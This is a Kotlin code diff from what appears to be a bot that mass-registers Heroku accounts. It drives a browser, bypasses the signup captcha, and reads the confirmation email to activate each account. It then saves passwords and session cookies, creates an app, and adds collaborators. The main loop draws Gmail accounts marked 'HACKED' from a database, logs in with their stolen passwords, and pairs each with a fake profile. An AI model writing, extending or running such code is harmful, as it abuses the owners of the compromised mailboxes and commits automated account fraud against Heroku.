@@ -25,7 +25,6 @@ import java.awt.event.KeyEvent
 
 fun main(args: Array<String>) {
     HerokuGeneric().run()
-
 }
 
 class HerokuRegister(
@@ -54,11 +53,17 @@ class HerokuRegister(
     fun registerHerokuRobot() {
         with(robotManager) {
             openBrowser()
+            for(i in 0..20){
+                if(isInputReady()) break
+            }
+
             browserGoTo("https://signup.heroku.com")
+
+            for(i in 0..20){
+                if(isInputReady()) break            }
 
             robot.keyPress(KeyEvent.VK_HOME)
             robot.keyRelease(KeyEvent.VK_HOME)
-
 
             clearAndPasteInput(firstName)
 
@@ -164,28 +169,7 @@ class HerokuRegister(
                     } else if (txt.contains("Almost there …\nPlease check your email") && txt.contains("to confirm your account.")) {
                         println("doooo 6")
                         closeWindow()
-                        Gmail(gmailUsername, gmailPassword).apply {
-                            onEvent(MailReceiveEvent(
-                                    key = "ona_heroku_sender",
-                                    validator = { mail ->
-                                        mail.receivedDate > registerTime
-                                                && Mail.CompareType.EQUAL_IGNORECASE.compare(mail.from, "noreply@heroku.com")
-                                                && Mail.CompareType.EQUAL_IGNORECASE.compare(mail.subject, "Confirm your account on Heroku")
-                                    },
-                                    callback = { mails ->
-                                        val mail =
-                                                mails.firstOrNull { it.content?.contains("Thanks for signing up with Heroku! You must follow this link to activate your account:") == true }
-                                        mail?.contentDocumented?.selectFirst("a[href^='https://id.heroku.com/account/accept/']")?.attr("href")?.let {
-                                            this.logout()
-                                            installDriver(it)
-                                        }
-                                    },
-                                    once = false,
-                                    new = true,
-                                    fetchContent = true
-                            )
-                            )
-                        }
+                        watingEmailConfirm(registerTime)
                         return@bypassCaptcha
                     }
                 }
@@ -196,9 +180,9 @@ class HerokuRegister(
         }
     }
 
-    private fun installDriver(acceptLink: String) {
-        val driverManager = DriverManager(driverType = DriverManager.BrowserType.Firefox)
-        val pageManager = PageManager(driverManager, acceptLink)
+    private fun watingEmailConfirm(registerTime: Long) {
+        val driverManager = DriverManager(driverType = DriverManager.BrowserType.Firefox, driverHeadless = false)
+        val pageManager = PageManager(driverManager)
         pageManager.addPageList(arrayListOf(
                 HerokuSetYourPasswordPage(password = password) {
                     herokuCollection.updateOne(
@@ -209,7 +193,7 @@ class HerokuRegister(
                 }.apply {
                     onPageDetect = {
                         herokuCollection.insertOne(
-                                org.bson.Document("email", email)
+                                Document("email", email)
                                         .append("password", password).append("firstName", firstName).append("lastName", lastName)
                                         .append("verify", true)
                         )
@@ -219,13 +203,13 @@ class HerokuRegister(
                 HerokuDashboardPage(action = HerokuDashboardPage.HerokuDashboardAction.CREATE_NEW_APP).apply {
                     onPageDetect = {
                         herokuCollection.updateOne(
-                                org.bson.Document("email", email),
+                                Document("email", email),
                                 Updates.set("cookies", pageManager.driver.cookieStr)
                         )
                     }
                 },
                 HerokuCreateNewAppPage(appName = appName) {
-                    herokuCollection.updateOne(org.bson.Document("email", email), Updates.set("appName", appName))
+                    herokuCollection.updateOne(Document("email", email), Updates.set("appName", appName))
                     println("HerokuCreateNewAppPage ${appName} success")
                 },
                 HerokuDeployPagePage(),
@@ -234,12 +218,34 @@ class HerokuRegister(
                      println("HerokuAccessPage ${collaboratorEmailList.joinToString(", ")} success")
                  }*/
         ))
+        pageManager.gmail = Gmail(gmailUsername, gmailPassword).apply {
+            onEvent(MailReceiveEvent(
+                    key = "ona_heroku_sender",
+                    validator = { mail ->
+                        mail.receivedDate > registerTime
+                                && Mail.CompareType.EQUAL_IGNORECASE.compare(mail.from, "noreply@heroku.com")
+                                && Mail.CompareType.EQUAL_IGNORECASE.compare(mail.subject, "Confirm your account on Heroku")
+                    },
+                    callback = { mails ->
+                        val mail =
+                                mails.firstOrNull { it.content?.contains("Thanks for signing up with Heroku! You must follow this link to activate your account:") == true }
+                        mail?.contentDocumented?.selectFirst("a[href^='https://id.heroku.com/account/accept/']")?.attr("href")?.let {
+                            this.logout()
+                            driverManager.get(it)
+                        }
+                    },
+                    once = false,
+                    new = true,
+                    fetchContent = true
+            )
+            )
+        }
 
         pageManager.run { pageResponse ->
             println(pageResponse)
             if (pageResponse is HerokuResponse.COLLABORATOR_ADDED) {
                 herokuCollection.updateOne(
-                        org.bson.Document("email", email),
+                        Document("email", email),
                         Updates.pushEach("collaborators", collaboratorEmailList)
                 )
             }
@@ -247,6 +253,7 @@ class HerokuRegister(
             isDone = true
         }
     }
+
 }
 
 class HerokuGeneric {
@@ -261,11 +268,11 @@ class HerokuGeneric {
 
     fun run() {
         while (true) {
-            val doc = eduCollection.random(org.bson.Document("login_status", "PASSWORD_CORRECT").append("email_status", "HACKED"))
+            val doc = eduCollection.random(Document("login_status", "PASSWORD_CORRECT").append("email_status", "HACKED"))
             if (doc != null && doc.containsKey("Allow less secure apps")) {
                 val gmailUsername = doc.getString("email")
                 val result = FakeProfileV2.getNewProfile() ?: continue
-                if (herokuCollection.countDocuments(org.bson.Document("email", gmailUsername)) > 0L) continue
+                if (herokuCollection.countDocuments(Document("email", gmailUsername)) > 0L) continue
                 HerokuRegister(
                         gmailUsername = gmailUsername,
                         gmailPassword = doc.getString("new_pass") ?: doc.getString("pass"),
